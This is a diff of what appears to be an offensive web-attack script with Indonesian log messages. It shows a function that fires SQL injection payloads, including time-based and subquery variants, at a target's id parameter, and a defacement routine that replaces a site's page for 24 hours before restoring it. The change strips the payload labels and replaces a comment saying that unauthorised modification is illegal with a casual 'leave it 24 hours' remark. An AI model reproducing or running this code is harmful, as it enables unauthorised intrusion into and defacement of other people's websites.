@@ -99,8 +99,8 @@ def advanced_sql_injection(url, session):
         "' AND 1=1 --", 
         "admin' OR 1=1--", 
         "%27%20OR%20%271%27%3D%271%27%3B%20--",
-        "admin' AND SLEEP(5)--",  # Time-based SQL Injection
-        "admin' AND (SELECT COUNT(*) FROM users)>0--"  # Advanced technique
+        "admin' AND SLEEP(5)--",  
+        "admin' AND (SELECT COUNT(*) FROM users)>0--"  
     ]
     for payload in payloads:
         send_request(url + "?id=" + payload, session)
@@ -178,8 +178,8 @@ def deface_payload(url, session, backup_file_path):
             logging.info(f"Deface berhasil dikirim ke {url}")
             print(f"{G}Deface berhasil! Periksa URL target.{N}")
             print(f"Menunggu selama 24 jam untuk mengembalikan halaman asli...")
-            time.sleep(86400)  # ubah tampa izin itu ilegal
-            restore_backup(url, backup_file_path, session)  # Kembalikan halaman asli
+            time.sleep(86400)  # biarkan saja 24 jam bung 
+            restore_backup(url, backup_file_path, session)  
         else:
             logging.error(f"Deface gagal, status code: {response.status_code}")
             print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
